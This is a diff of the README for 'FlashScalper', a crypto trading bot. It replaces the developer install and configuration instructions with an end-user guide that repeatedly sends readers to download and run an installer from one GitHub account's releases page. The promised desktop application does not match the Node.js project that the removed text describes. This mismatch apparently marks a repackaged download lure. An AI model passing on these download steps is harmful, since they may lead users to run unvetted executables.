@@ -1,281 +1,81 @@
-# FlashScalper
-
-> ⚠️ **DISCLAIMER**: This software is for educational and research purposes only. **NOT FOR PRODUCTION USE**. Trading involves substantial risk of loss. See [DISCLAIMER.md](DISCLAIMER.md) for full details.
-
-Crypto scalping trading agent.
-
-## Features
-
-- **Multi-Indicator Technical Analysis** - RSI, MACD, Bollinger Bands, Stochastic, ROC, Williams %R, ATR, Momentum, Volume analysis
-- **Agent Signal Confirmation** - Optional agent-based analysis for entry/exit decisions using OpenRouter API
-- **Adaptive Memory System** - Stores trade history and patterns to inform future signal filtering
-- **Pattern Recognition** - Identifies winning vs losing setups from historical data
-- **Risk Management** - Stop-loss, take-profit, trailing stops, daily loss limits, position sizing
-- **Real-Time Position Monitoring** - Continuous P&L tracking and exit condition evaluation
-- **Support/Resistance Analysis** - Optimized entry prices using limit orders
-- **Market Regime Detection** - Adapts strategy based on trending, ranging, or volatile market conditions
-- **Prometheus Metrics** - Metrics export for monitoring and observability
-
-## Prerequisites
+# 🚀 flash-scalper - Your Crypto Trading Companion
 
-- **Node.js** >= 18.0.0
-- **Redis** (optional, for worker mode)
-- **Exchange API Keys** (Aster or compatible exchange)
-- **OpenRouter API Key** (optional, for agent features)
+## 🌐 Download Now
+[![Download FlashScalper](https://img.shields.io/badge/Download-FlashScalper-blue.svg)](https://github.com/riyad242514/flash-scalper/releases)
 
-## Quick Start
+## 📋 Introduction
+FlashScalper is a crypto scalping trading agent designed for educational and research purposes. It helps you analyze market trends and make informed trading decisions. Please remember that trading involves risk. Use this tool to learn and understand the market better, but not for actual trading. 
 
-```bash
-# 1. Install dependencies
-npm install
+## ⚙️ Features
 
-# 2. Configure environment
-cp .env.example .env
-# Edit .env with your API keys
+- **Multi-Indicator Technical Analysis**: Understand market trends using indicators like RSI, MACD, and more.
+- **Agent Signal Confirmation**: Use advanced analysis for entry and exit strategies.
+- **Adaptive Memory System**: Learn from trade history to improve future trading.
+- **Pattern Recognition**: Identify winning setups by analyzing past performance.
+- **Risk Management**: Set stop-loss and take-profit limits to manage your risk.
+- **Real-Time Position Monitoring**: Keep track of your profit and loss at all times.
+- **Support/Resistance Analysis**: Optimize your entry prices for better results.
+- **Market Regime Detection**: Adapt your strategy based on market conditions.
 
-# 3. Build and run
-npm run build
-npm run start:scalper
-```
+## 🚀 Getting Started
 
-## Installation
+To start using FlashScalper, follow these simple steps:
 
-1. **Clone the repository:**
-   ```bash
-   git clone <repository-url>
-   cd flashscalper
-   ```
+### 1. Visit the Releases Page
+Go to the **Releases** page to find the latest version of FlashScalper. Click the link below to access it.
 
-2. **Install dependencies:**
-   ```bash
-   npm install
-   ```
+[**Visit the Releases Page**](https://github.com/riyad242514/flash-scalper/releases)
 
-3. **Configure environment variables:**
-   ```bash
-   cp .env.example .env
-   nano .env  # or use your preferred editor
-   ```
+### 2. Download the Application
+Once you're on the Releases page, you'll see a list of available versions. Look for the latest version, and you will find download options for different systems. Choose the option that matches your operating system and click it to download.
 
-4. **Build the project:**
-   ```bash
-   npm run build
-   ```
+### 3. Install the Application
+After the download completes, locate the downloaded file on your computer. Open the file to start the installation process. Follow the on-screen prompts to complete the installation.
 
-## Configuration
+### 4. Launch FlashScalper
+Once installed, you can find the FlashScalper icon on your desktop or in your applications menu. Double-click the icon to open the application.
 
-### Required Environment Variables
+## 📥 Download & Install
+To download FlashScalper, please visit the link below:
 
-| Variable | Description | Example |
-|----------|-------------|---------|
-| `ASTER_API_KEY` | Exchange API key | `your_api_key` |
-| `ASTER_SECRET_KEY` | Exchange secret key | `your_secret_key` |
+[**Download FlashScalper**](https://github.com/riyad242514/flash-scalper/releases)
 
-### Optional Environment Variables
-
-| Variable | Description | Default |
-|----------|-------------|---------|
-| `ASTER_BASE_URL` | Exchange API base URL | `https://fapi.asterdex.com` |
-| `OPENROUTER_API_KEY` | Agent API key (for signal confirmation) | - |
-| `OPENROUTER_MODEL` | Agent model to use | `deepseek/deepseek-chat-v3-0324` |
-| `LLM_ENABLED` | Enable agent analysis | `true` |
-| `SCALPER_LEVERAGE` | Trading leverage | `10` |
-| `SCALPER_POSITION_SIZE_PERCENT` | Position size as % of equity | `25` |
-| `SCALPER_MAX_POSITIONS` | Maximum concurrent positions | `20` |
-| `SCALPER_TAKE_PROFIT_ROE` | Take profit ROE % | `1.0` |
-| `SCALPER_STOP_LOSS_ROE` | Stop loss ROE % | `-0.5` |
-| `SCALPER_MAX_HOLD_TIME_MINUTES` | Maximum position hold time | `60` |
-| `SCALPER_DAILY_LOSS_LIMIT_PERCENT` | Daily loss limit % | `5` |
-| `MEMORY_ENABLED` | Enable adaptive memory system | `true` |
-| `MEMORY_MAX_TRADES` | Maximum trades to store in memory | `1000` |
-| `REDIS_URL` | Redis connection URL (for worker mode) | `redis://localhost:6379` |
-| `LOG_LEVEL` | Logging level | `info` |
+## ⚙️ System Requirements
+FlashScalper requires the following system specifications:
 
-See `src/config/index.ts` for all available configuration options.
-
-## Usage
+- **Operating System**: Windows 10 or later / macOS 10.15 or later
+- **Processor**: Intel i3 or equivalent 
+- **RAM**: 4 GB minimum 
+- **Storage**: 200 MB of free space
+- **Internet Connection**: Required for real-time data access and downloading updates
 
-### Standalone Mode (Recommended for Development)
-
-Run the scalper in a single process:
-
-```bash
-npm run start:scalper
-```
+## 🎓 How to Use FlashScalper
 
-This mode:
-- Runs the complete trading loop in one process
-- Fetches market data, generates signals, executes orders, and monitors positions
-- Logs all activity to console and files
-- Supports graceful shutdown (Ctrl+C)
+### Interface Overview
+After launching the application, you will see a simple interface. Here is a quick rundown of the main components:
 
-### Worker Mode (For Horizontal Scaling)
+- **Dashboard**: Displays your current trades, profit and loss details, and market conditions.
+- **Settings**: Adjust your risk management parameters and indicator preferences.
+- **Help Section**: Access detailed guides on using different features.
 
-Run separate workers for signal generation, execution, and position management:
+### Setting Up Indicators
+1. Navigate to the **Settings** tab.
+2. Select the indicators you want to use from the list.
+3. Adjust any necessary parameters and save your settings.
 
-```bash
-# Terminal 1: Signal Worker
-npm run start:signal-worker
+### Executing Trades
+1. Use the **Dashboard** to monitor real-time market data.
+2. When you see a potential trading opportunity, click the **Trade** button.
+3. Enter your trade details, including the amount and risk management settings.
+4. Confirm your trade.
 
-# Terminal 2: Execution Worker
-npm run start:execution-worker
+## 💬 Support and Guidance
+If you have questions or need assistance, refer to the **Help Section** within the application. For more in-depth guidance, you can check the official documentation in the repository or look for community forums.
 
-# Terminal 3: Position Worker
-npm run start:position-worker
+## ⚠️ Important Disclaimer
+This software is for educational and research purposes only. Do not use this tool for actual trading. Trading can lead to significant financial loss. For complete details, please refer to [DISCLAIMER.md](DISCLAIMER.md).
 
-# Or run all workers concurrently
-npm run start:all-workers
-```
+## 🌟 Conclusion
+FlashScalper provides powerful tools for understanding the crypto market. Whether you are learning to trade or simply exploring, this application can help you gain valuable insights. Make sure to comply with all legal requirements and use this software responsibly.
 
-### API Mode (Multi-User)
-
-Start the REST API and WebSocket server:
-
-```bash
-npm run start:api
-```
-
-## Architecture
-
-FlashScalper supports three deployment modes:
-
-1. **Standalone Mode** - Single-process trading bot (best for development/testing)
-2. **Worker Mode** - Distributed BullMQ workers for horizontal scaling
-3. **API Mode** - REST API + WebSocket for multi-user access
-
-### System Flow
-
-```
-Market Data → Technical Analysis → Signal Generation → Agent Confirmation (optional)
-    ↓
-Signal Scoring → Risk Checks → Order Execution → Position Monitoring
-    ↓
-Memory Learning ← Trade History ← Position Closed
-```
-
-For detailed architecture documentation, see [ARCHITECTURE.md](ARCHITECTURE.md).
-
-## Project Structure
-
-```
-flashscalper/
-├── src/
-│   ├── strategies/          # Trading strategies (scalper-strategy.ts)
-│   ├── services/
-│   │   ├── signal/          # Signal generation and technical analysis
-│   │   ├── execution/       # Order execution and exchange client
-│   │   ├── position/        # Position management and monitoring
-│   │   ├── memory/          # Adaptive memory and learning system
-│   │   └── artifacts/       # Run artifact collection
-│   ├── config/              # Configuration management
-│   ├── types/               # TypeScript type definitions
-│   ├── utils/               # Logging, metrics, utilities
-│   ├── workers/             # BullMQ workers (for worker mode)
-│   ├── queues/              # Job queue definitions
-│   └── api/                 # REST API server
-├── tests/                   # Unit and integration tests
-├── dist/                    # Compiled JavaScript (generated)
-├── data/                    # Memory persistence data
-└── artifacts/               # Trading run artifacts
-```
-
-## Testing
-
-Run the test suite:
-
-```bash
-# Run all tests
-npm test
-
-# Run with coverage
-npm test -- --coverage
-
-# Run specific test file
-npm test -- tests/unit/signal-scorer.test.ts
-```
-
-Test coverage includes:
-- Unit tests for all core services
-- Integration tests for agent and memory systems
-- Technical analysis validation
-- Risk management logic
-
-## Monitoring
-
-### Prometheus Metrics
-
-Metrics are available at `http://localhost:9090/metrics` (when metrics server is enabled):
-
-- `flashscalper_trades_total` - Total trades by result
-- `flashscalper_trade_pnl_usd` - Trade PnL histogram
-- `flashscalper_signals_total` - Signals generated
-- `flashscalper_agent_equity_usd` - Agent equity
-- `flashscalper_llm_latency_ms` - Agent API latency
-- And many more...
-
-### Logging
-
-Structured JSON logging with Pino:
-- Development: Pretty-printed console output
-- Production: JSON logs for log aggregation systems
-- Log levels: `trace`, `debug`, `info`, `warn`, `error`, `fatal`
-
-## Memory System
-
-FlashScalper includes an adaptive memory system that stores trade history:
-
-- **Trade History Memory** - Stores completed trades with full context
-- **Pattern Recognition** - Tracks winning vs losing signal patterns
-- **Market Regime Memory** - Tracks performance across different market conditions
-- **Symbol Performance Tracking** - Records which symbols perform better
-- **Adaptive Filters** - Adjusts signal filters based on historical performance patterns
-
-Memory is persisted to disk and automatically loaded on startup.
-
-## Risk Management
-
-Built-in risk management features:
-
-- **Position Sizing** - Dynamic sizing based on signal confidence and recent performance
-- **Stop Loss** - Configurable ROE-based stop loss with early triggers
-- **Take Profit** - Target-based profit taking
-- **Trailing Stops** - Dynamic stop adjustment for favorable moves
-- **Daily Loss Limits** - Automatic shutdown on excessive losses
-- **Max Positions** - Limits concurrent exposure
-- **Max Hold Time** - Prevents positions from being held too long
-
-## Contributing
-
-We welcome contributions! Please see [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
-Key points:
-- This is experimental software for educational purposes
-- Follow existing code patterns and style
-- Add tests for new features
-- Update documentation as needed
-
-## License & Disclaimer
-
-- **License**: MIT License - See [LICENSE](LICENSE) for details
-- **Disclaimer**: **NOT FOR PRODUCTION USE** - See [DISCLAIMER.md](DISCLAIMER.md) for important warnings
-
-**Important**: This software is for educational and research purposes only. Trading involves substantial risk of loss. Always test with paper trading first and never risk more than you can afford to lose.
-
-## Support
-
-- **Documentation**: See [ARCHITECTURE.md](ARCHITECTURE.md) for detailed technical documentation
-- **Issues**: Report bugs or request features via GitHub Issues
-- **Contributions**: See [CONTRIBUTING.md](CONTRIBUTING.md) for how to contribute
-
-## Acknowledgments
-
-Built with:
-- TypeScript for type safety
-- Pino for structured logging
-- Prometheus for metrics
-- BullMQ for job queues
-- OpenRouter for agent access
-
----
-
-**Remember**: Always start with paper trading and small amounts. Monitor closely and understand the code before using real funds.
+Feel free to explore all the features and happy trading!
